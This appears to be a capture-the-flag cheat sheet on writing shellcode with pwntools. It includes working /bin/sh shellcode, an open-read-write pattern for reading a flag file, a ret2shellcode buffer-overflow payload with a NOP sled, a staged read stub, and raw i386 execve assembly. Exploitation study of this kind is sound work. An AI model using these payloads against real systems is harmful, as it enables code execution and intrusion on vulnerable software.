# Shellcode Basics

## Quick Start

```python
from pwn import *
context.arch = "amd64"
context.os = "linux"
sc = asm(shellcraft.sh())
```

**shellcraft.sh()** generates a standard `execve("/bin/sh", 0, 0)` shellcode (~30 bytes).

## Common Shellcraft Templates

```python
asm(shellcraft.sh())                                              # /bin/sh
asm(shellcraft.execve("/bin/sh", 0, 0))                          # explicit execve
asm(shellcraft.cat("/flag.txt"))                                  # cat file to stdout
asm(shellcraft.open("/flag.txt") +                               # ORW pattern
     shellcraft.read("rax", "rsp", 0x100) +
     shellcraft.write(1, "rsp", 0x100))
```

## ret2shellcode

**When:** NX is disabled. You overflow a buffer and jump to shellcode on the stack or in a known RWX region.

```python
sc = asm(shellcraft.sh())
# offset = padding to saved return address
payload = flat({offset: [b"\x90"*32, sc, b"A"*(200-32-len(sc)), shellcode_addr]})
```

The NOP sled (`\x90`) at the start gives you some room if the jump target isn't exact.

## Staged Read (Small Input)

**When:** The initial shellcode buffer is too small for a full shellcode (< 32 bytes or so).

**How it works:** Fit a small stub that calls `read(0, rsp, len)` to read a larger shellcode, then `jmp rsp` to execute it.

```python
stage1 = asm(shellcraft.read(0, "rsp", 0x400) + "jmp rsp")
stage2 = asm(shellcraft.sh())
io.send(stage1)                    # small stub
io.send(stage2)                    # full shellcode (staged)
```

## i386

```python
context.arch = "i386"
sc = asm(shellcraft.sh())
```

Or manually:

```asm
xor eax, eax
push eax
push 0x68732f2f
push 0x6e69622f
mov ebx, esp
xor ecx, ecx
xor edx, edx
mov al, 0xb
int 0x80
```

## Debug Shellcode

```bash
# Check seccomp rules
seccomp-tools dump ./chall

# Trace syscalls
strace -f ./chall

# In GDB, set breakpoint before shellcode runs:
# b *address; c; ni; si
```
